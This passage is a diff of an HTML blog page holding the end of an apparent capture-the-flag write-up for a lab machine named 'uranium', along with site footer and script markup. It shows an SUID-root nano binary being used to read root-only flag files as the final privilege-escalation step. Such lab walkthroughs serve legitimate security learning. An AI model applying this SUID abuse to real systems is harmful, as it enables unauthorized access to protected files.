+</span></span><span style=display:flex><span>lrwxrwxrwx <span style=color:#ae81ff>1</span> root  root       <span style=color:#ae81ff>9</span> Apr <span style=color:#ae81ff>25</span> 11:12 .bash_history -&gt; /dev/null
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4    <span style=color:#ae81ff>220</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .bash_logout
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4   <span style=color:#ae81ff>3771</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .bashrc
+</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> kral4 kral4 <span style=color:#ae81ff>109960</span> Apr  <span style=color:#ae81ff>9</span> 16:35 chat_with_hakanbey
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4      <span style=color:#ae81ff>5</span> Apr <span style=color:#ae81ff>23</span> 14:03 .check
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>3</span> kral4 kral4   <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>10</span> 00:21 .local
+</span></span><span style=display:flex><span>-rwsrwxrwx <span style=color:#ae81ff>1</span> root  root  <span style=color:#ae81ff>245872</span> Aug <span style=color:#ae81ff>21</span> 11:40 nano
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4    <span style=color:#ae81ff>807</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .profile
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> kral4 kral4     <span style=color:#ae81ff>38</span> Apr <span style=color:#ae81ff>10</span> 00:21 user_2.txt
+</span></span><span style=display:flex><span>You have new mail in /var/mail/kral4
+</span></span></code></pre></div><p>Perfect! We have now the <code>SUID</code> in the <code>nano</code> binary, so we can read the remaining flags!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kral4@uranium:/home/kral4$ ./nano /root/root.txt
+</span></span><span style=display:flex><span>kral4@uranium:/home/kral4$ ./nano /var/www/html/web_flag.txt
+</span></span></code></pre></div><p>And we &ldquo;rooted&rdquo; the machine!</p><p>That&rsquo;s all from my side, hope you find this helpful!</p></div><div class=pagination>
 <div class=pagination__title>
 <span class=pagination__title-h>Read other posts</span>
 <hr>
-</div>
-<div class=pagination__buttons>
+</div><div class=pagination__buttons>
 <span class="button previous">
 <a href=/posts/jason/>
 <span class=button__icon>←</span>
@@ -400,25 +331,15 @@ kral4@uranium:/home/kral4$ ./nano /var/www/html/web_flag.txt
 <span class=button__icon>→</span>
 </a>
 </span>
-</div>
-</div>
-<div id=hyvor-talk-view></div>
-<script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
+</div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
 <script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
-</div>
-</div>
-<footer class=footer>
+</div></div><footer class=footer>
 <div class=footer__inner>
-<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div>
-</div>
-</footer>
-<script src=/assets/main.js></script>
+<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
 <script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
-<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
+<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
 <script type=module src=/assets/ionicons/ionicons.esm.js></script>
 <script nomodule src=/assets/ionicons/ionicons.js></script>
-</div>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
-</body>
-</html>
+</div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
+</body></html>
